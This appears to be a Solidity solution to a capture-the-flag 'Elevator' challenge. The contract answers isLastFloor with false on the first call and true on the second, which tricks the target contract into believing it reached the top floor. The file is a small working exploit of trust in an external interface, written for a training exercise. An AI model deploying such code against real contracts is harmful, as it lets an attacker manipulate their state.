// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Building} from "./Elevator.sol";

interface IElevator {
    function goTo(uint256) external;
}

contract SolveElevator is Building {
    mapping(uint256 => bool) floorVisited;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function callGoto(uint256 floor) external {
        bytes memory data = abi.encodeWithSignature("goTo(uint256)", floor);
        (bool success,) = target.call(data);
        require(success, "goTo() revert");
    }

    function isLastFloor(uint256 lastFloor) external returns (bool result) {
        result = floorVisited[lastFloor];
        if (!result) {
            floorVisited[lastFloor] = true;
        }
    }
}
